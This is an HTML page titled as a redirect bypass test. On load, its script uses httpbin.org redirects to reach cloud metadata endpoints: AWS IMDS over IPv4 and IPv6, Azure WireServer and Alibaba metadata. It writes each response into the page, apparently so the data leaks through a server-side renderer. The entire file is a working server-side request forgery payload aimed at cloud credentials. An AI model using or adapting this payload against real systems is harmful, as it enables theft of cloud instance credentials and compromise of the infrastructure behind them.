<!DOCTYPE html>
<html><body>
<h1>REDIRECT_BYPASS_TEST</h1>
<div id="r1">INITIAL</div>
<div id="r2">INITIAL</div>
<div id="r3">INITIAL</div>
<div id="r4">INITIAL</div>
<div id="r5">INITIAL</div>
<div id="r6">INITIAL</div>
<script>
function syncFetch(id, url) {
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, false);
    xhr.send();
    document.getElementById(id).innerText = id + ' [' + xhr.status + '] ' + xhr.responseText.substr(0, 1500);
  } catch(e) {
    document.getElementById(id).innerText = id + ' [ERR] ' + e.name + ':' + e.message.substr(0,300);
  }
}

setTimeout(function() {
  // Redirect to IPv6 IMDS via httpbin
  syncFetch('r1', 'https://httpbin.org/redirect-to?url=http%3A%2F%2F%5Bfd00%3Aec2%3A%3A254%5D%2Flatest%2Fmeta-data%2F');
  
  // Redirect to IPv4 IMDS via httpbin
  syncFetch('r2', 'https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F');
  
  // Redirect to IMDS via httpbin with status_code=307 (preserve method)
  syncFetch('r3', 'https://httpbin.org/redirect-to?url=http%3A%2F%2F%5Bfd00%3Aec2%3A%3A254%5D%2Flatest%2Fmeta-data%2F&status_code=307');
  
  // Redirect to Azure WireServer
  syncFetch('r4', 'https://httpbin.org/redirect-to?url=http%3A%2F%2F168.63.129.16%2Fmachine%3Fcomp%3Dgoalstate');
  
  // Redirect to Alibaba metadata
  syncFetch('r5', 'https://httpbin.org/redirect-to?url=http%3A%2F%2F100.100.100.200%2Flatest%2Fmeta-data%2F');
  
  // Redirect to HTTPS IMDS (just to see what happens)
  syncFetch('r6', 'https://httpbin.org/redirect-to?url=https%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F');
}, 0);
</script>
</body></html>
